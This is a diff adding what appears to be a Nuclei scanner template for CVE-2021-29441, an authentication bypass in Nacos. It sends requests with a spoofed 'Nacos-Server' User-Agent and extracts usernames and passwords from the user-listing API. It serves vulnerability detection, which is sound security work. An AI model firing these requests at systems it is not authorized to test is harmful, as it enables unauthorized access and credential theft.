@@ -1,0 +1,43 @@
+id: nacos-permission-bypass
+
+info:
+  name: Nacos Permission Bypass Vulnerability (CVE-2021-29441)
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Nacos uses the AuthFilter servlet filter to enforce authentication. This filter can be bypassed by modifying the `User-Agent` header to `Nacos-Server`, potentially allowing any user to perform administrative tasks.
+  tags: permission-bypass
+  reference:
+    - https://securitylab.github.com/advisories/GHSL-2020-325_326-nacos/
+
+http:
+  - raw:
+      - |
+        GET /nacos/v1/auth/users?pageNo=1&pageSize=9 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Nacos-Server
+
+      - |
+        GET /v1/auth/users?pageNo=1&pageSize=9 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Nacos-Server
+
+    stop-at-first-match: true
+    matchers-condition: or
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "username"
+          - "password"
+
+    extractors:
+      - type: json
+        part: body
+        json:
+          - '.pageItems[].username'
+          - '.pageItems[].password'
